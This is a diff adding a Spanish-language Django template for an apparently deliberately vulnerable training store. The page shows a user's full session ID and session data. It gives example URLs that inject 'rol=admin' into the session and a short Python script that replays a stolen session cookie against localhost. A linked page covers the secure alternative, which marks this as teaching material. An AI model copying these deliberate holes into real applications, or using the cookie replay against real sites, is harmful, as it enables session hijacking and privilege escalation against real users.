@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Sesión Vulnerable · TiendaTest</title>
+  {% load static %}
+  <link rel="stylesheet" href="{% static 'store/css/main.css' %}">
+</head>
+<body class="app-body">
+  {% include 'store/navbar.html' %}
+  <div class="app-container">
+    <section class="panel-section">
+      <div class="section-header">
+        <h2>🍪 Sesión Vulnerable</h2>
+        <span class="badge badge-off">⚠️ Session ID expuesto</span>
+      </div>
+      <div class="info-grid" style="margin-bottom:1.5rem">
+        <div class="info-item">
+          <span class="info-label">Session ID completo</span>
+          <span class="info-value" style="font-family:monospace;font-size:.8rem;color:#f97316;word-break:break-all">{{ session_id }}</span>
+        </div>
+      </div>
+      <h4 style="margin-bottom:.75rem">Datos en sesión:</h4>
+      <div class="table-wrap">
+        <table class="data-table">
+          <thead><tr><th>Clave</th><th>Valor</th></tr></thead>
+          <tbody>
+            {% for k, v in datos_sesion.items %}
+            <tr><td><code>{{ k }}</code></td><td>{{ v }}</td></tr>
+            {% empty %}
+            <tr><td colspan="2" class="empty-msg">Sesión vacía</td></tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+      <div style="margin-top:1.5rem">
+        <h4>⚠️ Inyectar datos en la sesión vía URL:</h4>
+        <pre class="code-block">http://127.0.0.1:8000/sesion-vulnerable/?set_key=rol&set_val=admin
+http://127.0.0.1:8000/sesion-vulnerable/?set_key=username&set_val=admin</pre>
+        <p style="color:var(--muted);font-size:.82rem;margin-top:.5rem">Pega estas URLs en el navegador y recarga para ver cómo se inyectan datos en la sesión.</p>
+      </div>
+      <div style="margin-top:1.5rem">
+        <h4>🧪 Robo de sesión (desde otra pestaña):</h4>
+        <pre class="code-block">import requests
+
+# Simula usar el session ID robado
+session_id = "{{ session_id }}"
+cookies = {"sessionid": session_id}
+r = requests.get("http://127.0.0.1:8000/tienda/", cookies=cookies)
+print("Acceso obtenido" if r.status_code == 200 else "Fallido")</pre>
+      </div>
+    </section>
+    <section class="panel-section">
+      <div class="section-header">
+        <h2>🛡️ Defensa — Sesión segura</h2>
+        <span class="badge badge-ok">Protegido</span>
+      </div>
+      <a href="{% url 'sesion_segura' %}" class="btn btn-primary">Ver sesión segura →</a>
+    </section>
+  </div>
+</body>
+</html>
